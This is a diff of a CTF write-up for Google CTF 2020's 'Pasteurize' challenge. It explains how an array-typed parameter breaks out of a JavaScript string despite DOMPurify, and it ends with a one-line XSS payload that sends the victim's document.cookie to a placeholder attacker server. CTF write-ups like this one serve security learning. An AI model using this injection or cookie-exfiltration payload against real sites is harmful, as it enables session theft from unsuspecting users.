@@ -12,7 +12,8 @@ author: Vie
 
 # Pasteurize 
 
-The first aweb challenge from Google CTF 2020. It's a simple website that holds "pastes", or notes, that take your input and store it onto a note webpage. You make a note, and then you can share it with some entity called "TJMike". Pretty cut and clear XSS attack. 
+The first web challenge from Google CTF 2020. It's a simple website that holds "pastes", or notes, that take your input and store it onto a note webpage. You make a note, and then you can share it with some entity called "TJMike". Pretty cut and clear XSS attack. 
+
 
 Unfortunately, it's not that simple: 
 
@@ -31,7 +32,9 @@ Unfortunately, it's not that simple:
     
 ```
 
-There's a `<script>` tag in the HTML of the note we create that takes our input, puts it into a `note` variable, and then cleans it using [DOMpurify](https://www.npmjs.com/package/dompurify). The DOMpurify npm library is a pretty robust one, and I doubted that Google wanted us to 0day it to solve this challenge. Can we escape out of that `note` variable? If we could, say, inject our own quotation marks in there? If we could, then since we're already in a Javascript context, we could do all sorts of commands and implanting an XSS payload would be pretty easy to do. What's also interesting is the presence of that suspicious HTML comment, just above the `<script>` tag. More on that in a second. 
+
+There's a `<script>` tag in the HTML of the note we create that takes our input, puts it into a `note` variable, and then cleans it using [DOMpurify](https://www.npmjs.com/package/dompurify). The DOMpurify npm library is a pretty robust one, and I doubt that Google wanted us to 0day it to solve this challenge. Can we escape out of that `note` variable? If we could, say, inject our own quotation marks in there? If we could, then since we're already in a Javascript context, we could do all sorts of commands and implanting an XSS payload would be pretty easy to do. What's also interesting is the presence of that suspicious HTML comment, just above the `<script>` tag. More on that in a second. 
+
 
 Putting a pin on that - if we examine how the requests are made when we submit our note, we see that a POST request is made where our input is in that request body, given to the server to process accordingly.
 
@@ -82,7 +85,8 @@ We can succesfully escape from that `note` variable from before and have an aler
 ```
 And so the `alert` function is being correctly evaluated as javascript instead of as part of a string.
 
-The rest of the challenge is a pretty cut and clear XSS - craft a payload that steaks a cookie and sends it to your server on load of the note webpage, and share that with TJMike.
+The rest of the challenge is a pretty cut and clear XSS - craft a payload that steals a cookie and sends it to your server on load of the note webpage, and share that with TJMike.
+
 
 ```
 content[] = ; document.getElementByID('note-content').onLoad = fetch("SER.ver?Cookie="%2Bbtoa(document.cookie))
